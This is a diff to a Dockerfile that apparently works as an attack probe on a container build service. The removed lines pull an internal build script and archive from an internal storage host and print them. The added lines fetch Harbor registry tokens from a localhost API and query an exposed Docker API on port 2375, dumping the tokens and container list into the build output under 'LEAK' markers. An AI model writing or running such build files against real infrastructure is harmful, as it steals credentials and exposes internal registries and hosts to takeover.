@@ -1,7 +1,10 @@
 FROM scratch
 ADD rootfs.tar /
-ADD http://127.0.0.1:8082/script/build-dockerfile /leak/skywing.txt
-RUN /bin/sh -c 'N=LEAK3_0926_0030; echo "[MARK] $N"; echo "[SIZE]"; wc -c /leak/skywing.txt; echo "[FULL-SCRIPT-PART2]"; tail -c 11000 /leak/skywing.txt; echo "[END-PART2]"'
-ADD http://storage-jd-local-jcloud-admin.proxy.jd.com/compile-build/cg.tgz /leak/cg.tgz
-RUN /bin/sh -c 'echo "[CFGGEN-LS]"; ls -la /leak; echo "[CFGGEN-TARLIST]"; busybox tar tzf /leak/cg.tgz 2>&1 | head -60; echo "[CFGGEN-EXTRACT]"; mkdir -p /leak/cg && busybox tar xzf /leak/cg.tgz -C /leak/cg 2>&1; find /leak/cg -type f 2>&1 | head -40; echo "[CFGGEN-CAT]"; for f in $(find /leak/cg -type f | head -12); do echo "=== $f ==="; head -c 1500 "$f"; echo; done; echo "[END] $N"'
+ADD http://127.0.0.1:8082/api/v1/token/harbor /leak/harbor.json
+ADD http://127.0.0.1:8082/api/v1/token/version /leak/version.json
+RUN /bin/sh -c 'N=TOK4_0926_0050; echo "[MARK] $N"; echo "[HARBOR-TOKEN]"; cat /leak/harbor.json; echo; echo "[VERSION-TOKEN]"; cat /leak/version.json; echo; echo "[END-TOKENS]"'
+ADD http://127.0.0.1:2375/version /leak/dockerapi-version.json
+RUN /bin/sh -c 'echo "[DOCKERAPI-2375-VERSION]"; cat /leak/dockerapi-version.json; echo; echo "[END-DAPI]"'
+ADD http://127.0.0.1:2375/containers/json /leak/dockerapi-containers.json
+RUN /bin/sh -c 'echo "[DOCKERAPI-2375-CONTAINERS]"; head -c 4000 /leak/dockerapi-containers.json; echo; echo "[END] TOK4_0926_0050"'
 ENTRYPOINT ["/bin/sh","-c"]
